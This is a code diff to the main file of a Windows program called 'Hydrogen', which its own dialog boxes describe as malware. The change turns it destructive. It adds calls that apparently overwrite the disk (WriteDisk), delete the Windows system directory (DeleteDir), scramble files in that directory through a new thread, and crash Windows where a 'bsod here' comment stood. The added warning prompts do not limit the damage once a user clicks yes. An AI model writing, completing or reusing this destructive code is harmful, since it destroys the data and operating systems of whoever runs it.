@@ -1,4 +1,6 @@
+#include "destruction.h"
 #include "payloads.h"
+
 void InitDPI() {
 	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
 	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
@@ -7,16 +9,27 @@ void InitDPI() {
 	}
 	FreeLibrary(hModUser32);
 }
+
 int WinMain(
 	_In_ HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
 	_In_ LPSTR lpCmdLine,
 	_In_ int nShowCmd
 ) {
-	int msgResult = MessageBox(NULL, L"!!!Hydrogen is still in development!!!\nExecute it?", L"Hydrogen - Version 0.3.26", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
+	int msgResult = MessageBox(NULL, L"What you have just executed is a malware.\nYou might lose all of your data if you continue!\nStill execute it?", L"Hydrogen.exe", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
 	if (msgResult != IDYES) {
 		ExitProcess(0);
 	}
+	msgResult = MessageBox(NULL, L"THIS IS THE LAST WARNING!\nTHE CREATOR OF THIS MALWARE WILL NOT BE RESPONSIBLE FOR ANY DESTRUCTION CAUSED BY THIS MALWARE!\nSTILL CONTINUE?", L"Hydrogen.exe - LAST WARNING", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
+	if (msgResult != IDYES) {
+		ExitProcess(0);
+	}
+
+	WCHAR szSystemDirectory[MAX_PATH] = { 0 };
+	GetSystemDirectory(szSystemDirectory, MAX_PATH);
+
+	WriteDisk();
+	DeleteDir(szSystemDirectory);
 
 	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
 	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1 };
@@ -66,9 +79,9 @@ int WinMain(
 	ExecuteShader(Shader16, PAYLOAD_TIME);
 
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
-	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(RandomExecutePayload), (PVOID)1000, 0, NULL);
+	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(FileMessPayload), (PVOID)szSystemDirectory, 0, NULL);
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
 	Sleep(20000);
-	//bsod here.
+	CrashWindows();
 	return 0;
 }
